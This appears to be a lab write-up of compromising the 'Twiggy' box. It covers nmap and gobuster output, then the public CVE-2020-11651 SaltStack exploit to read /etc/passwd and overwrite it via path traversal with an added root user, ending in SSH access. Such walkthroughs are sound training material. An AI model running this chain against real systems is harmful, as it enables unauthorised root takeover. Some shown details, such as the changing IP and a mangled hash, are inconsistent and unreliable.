nmap -p- -T4 192.168.217.62 -v

PORT     STATE SERVICE  
22/tcp   open  ssh  
53/tcp   open  domain  
80/tcp   open  http  
4505/tcp open  unknown  
4506/tcp open  unknown  
8000/tcp open  http-alt


sudo nmap -Pn -A -p 22,53,80,4505,4506,8000 192.168.217.62

PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)  
| ssh-hostkey:    
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)  
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)  
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)  

53/tcp   open  domain  NLnet Labs NSD  

80/tcp   open  http    nginx 1.16.1  
|_http-server-header: nginx/1.16.1  
|_http-title: Home | Mezzanine  

4505/tcp open  zmtp    ZeroMQ ZMTP 2.0  

4506/tcp open  zmtp    ZeroMQ ZMTP 2.0  

8000/tcp open  http    nginx 1.16.1  
|_http-title: Site doesn't have a title (application/json).  
|_http-open-proxy: Proxy might be redirecting requests  
|_http-server-header: nginx/1.16.1  
 
open and 1 closed port  
Device type: general purpose|router  
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X  
(91%)  
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:l  
inux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:  
linux:linux_kernel:5.6.3  
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux  
3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4  
- 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91  
%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 4 hops  
  
TRACEROUTE (using port 53/tcp) 
HOP RTT      ADDRESS  
1   77.96 ms 192.168.45.1  
2   77.95 ms 192.168.45.254  
3   78.03 ms 192.168.251.1  
4   78.10 ms 192.168.217.62

This is on port 80 and not usefull at all
gobuster dir -u http://mezzanine.org -w /home/enzy/Documents/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mezzanine.org
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/enzy/Documents/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://mezzanine.org/f19668f3-3a1e-4ec7-8103-a2d3cf3bf16a => 301 (Length: 0). To continue please exclude the status code or the length



gobuster dir -u http://mezzanine.org:8000 -w /home/enzy/Documents/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mezzanine.org:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/enzy/Documents/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/användare            (Status: 500) [Size: 1455]
/events               (Status: 401) [Size: 753]
/hook                 (Status: 401) [Size: 753]
/index                (Status: 200) [Size: 146]
/jobs                 (Status: 401) [Size: 753]
/keys                 (Status: 401) [Size: 753]
/login                (Status: 200) [Size: 43]
/logout               (Status: 500) [Size: 823]
/run                  (Status: 200) [Size: 146]
/secci�               (Status: 500) [Size: 1455]
/stats                (Status: 401) [Size: 753]
/token                (Status: 200) [Size: 146]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

Still this one is not useful when going to the web pages nothing interesting but two pages:
![Pasted image 20250416152255](https://github.com/user-attachments/assets/d238a373-eb58-42a4-8b98-eaaf566ac537)



and page /användare :
![Uploading Pasted image 20250416152402.png…]()

Googling the content of page on
![Pasted image 20250416152444](https://github.com/user-attachments/assets/bb914347-d35f-413c-bc00-0f7865211cee)
e:


found this is a saltstack and then searched it for exploits:
![Pasted image 20250416152621](https://github.com/user-attachments/assets/135e7e7b-2641-4e81-b690-edbde1bd9990)


so there is a existing exploit for this vulnerability:
![Pasted image 20250416232408](https://github.com/user-attachments/assets/61ac2634-3591-4082-804f-41d5b83d955a)



doing some research figured neet to install python3-salt 
sudo pipx install salt
and then find the options to use the exploit:
python3 exploit.py -m <master ip> -p <master port> [other options]
Had problem with salt funcion and it's dependencies so took hell of a time to realise that this will not work and won't get install with pip, pip3 or even pipx installation won't work but I figured it will work using uv.

uv run 48421.py -m 192.168.217.62 --read /etc/passwd    
[!] Please only use this script to verify you have correctly patched systems y  
ou have permission to access. Hit ^C to abort.  
/home/enzy/Documents/offsecPGP/twiggy/.venv/lib/python3.13/site-packages/salt/  
transport/client.py:28: DeprecationWarning: This module is deprecated. Please  
use salt.channel.client instead.  
 warn_until(  
[+] Checking salt-master (192.168.217.62:4506) status... ONLINE  
[+] Checking if vulnerable to CVE-2020-11651... YES  
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skN  
XpMmON4009lLtSZ9DRlk=  
[+] Attemping to read /etc/passwd from 192.168.217.62  
root:x:0:0:root:/root:/bin/bash  
bin:x:1:1:bin:/bin:/sbin/nologin  
daemon:x:2:2:daemon:/sbin:/sbin/nologin  
adm:x:3:4:adm:/var/adm:/sbin/nologin  
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin  
sync:x:5:0:sync:/sbin:/bin/sync  
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown  
halt:x:7:0:halt:/sbin:/sbin/halt  
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin  
operator:x:11:0:operator:/root:/sbin/nologin  
games:x:12:100:games:/usr/games:/sbin/nologin  
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin  
nobody:x:99:99:Nobody:/:/sbin/nologin  
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin  
dbus:x:81:81:System message bus:/:/sbin/nologin  
polkitd:x:999:998:User for polkitd:/:/sbin/nologin  
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin  
postfix:x:89:89::/var/spool/postfix:/sbin/nologin  
chrony:x:998:996::/var/lib/chrony:/sbin/nologin  
mezz:x:997:995::/home/mezz:/bin/false  
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin  
named:x:25:25:Named:/var/named:/sbin/nologin

Then copied this to a make up passwd file and used openssl to get the password

openssl passwd password  
$1$b1F8C6ZX$L0hizE7xu7xoxPGXuQY801

and then add my own root user to the passwd file:

echo "enzy:$1$KRe3uMO6$4qefY5nveklizZBNTaycf1:0:0:root:/root:/bin/bash" >>passwd

Trying to upload the modified passwd file:

uv run 48421.py -m 192.168.194.62 --upload-src /home/enzy/Documents/offsecPGP/twiggy/passwd --upload-dest /etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/enzy/Documents/offsecPGP/twiggy/.venv/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.194.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[-] Destination path must be relative; aborting

The path is not relative so let's try path traversal with this:

uv run 48421.py -m 192.168.194.62 --upload-src /home/enzy/Documents/offsec  
PGP/twiggy/passwd --upload-dest ../../../../../../../../../etc/passwd  
[!] Please only use this script to verify you have correctly patched systems y  
ou have permission to access. Hit ^C to abort.  
/home/enzy/Documents/offsecPGP/twiggy/.venv/lib/python3.13/site-packages/salt/  
transport/client.py:28: DeprecationWarning: This module is deprecated. Please  
use salt.channel.client instead.  
 warn_until(  
[+] Checking salt-master (192.168.194.62:4506) status... ONLINE  
[+] Checking if vulnerable to CVE-2020-11651... YES  
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skN  
XpMmON4009lLtSZ9DRlk=  
[+] Attemping to upload /home/enzy/Documents/offsecPGP/twiggy/passwd to ../../  
../../../../../../../etc/passwd on 192.168.194.62  
[ ] Wrote data to file /srv/salt/../../../../../../../../../etc/passwd

let's check if it worked:

uv run 48421.py -m 192.168.194.62 --read /etc/passwd  
[!] Please only use this script to verify you have correctly patched systems y  
ou have permission to access. Hit ^C to abort.  
/home/enzy/Documents/offsecPGP/twiggy/.venv/lib/python3.13/site-packages/salt/  
transport/client.py:28: DeprecationWarning: This module is deprecated. Please  
use salt.channel.client instead.  
 warn_until(  
[+] Checking salt-master (192.168.194.62:4506) status... ONLINE  
[+] Checking if vulnerable to CVE-2020-11651... YES  
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skN  
XpMmON4009lLtSZ9DRlk=  
[+] Attemping to read /etc/passwd from 192.168.194.62  
root:x:0:0:root:/root:/bin/bash  
bin:x:1:1:bin:/bin:/sbin/nologin  
daemon:x:2:2:daemon:/sbin:/sbin/nologin  
adm:x:3:4:adm:/var/adm:/sbin/nologin  
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin  
sync:x:5:0:sync:/sbin:/bin/sync  
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown  
halt:x:7:0:halt:/sbin:/sbin/halt  
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin  
operator:x:11:0:operator:/root:/sbin/nologin  
games:x:12:100:games:/usr/games:/sbin/nologin  
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin  
nobody:x:99:99:Nobody:/:/sbin/nologin  
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin  
dbus:x:81:81:System message bus:/:/sbin/nologin  
polkitd:x:999:998:User for polkitd:/:/sbin/nologin  
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin  
postfix:x:89:89::/var/spool/postfix:/sbin/nologin  
chrony:x:998:996::/var/lib/chrony:/sbin/nologin  
mezz:x:997:995::/home/mezz:/bin/false  
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin  
named:x:25:25:Named:/var/named:/sbin/nologin  
enzy:qefY5nveklizZBNTaycf1:0:0:root:/root:/bin/bash

perfect it worked. Now let's ssh to the account:
![Pasted image 20250416232423](https://github.com/user-attachments/assets/1ce04cc6-8587-4182-a76c-19f3f9c90362)



This was one of the ways. 
another way is to upload webshell to the the targets /var/www/html directory using the found vulnerability and use that webshell to get a reverce shell and so on..
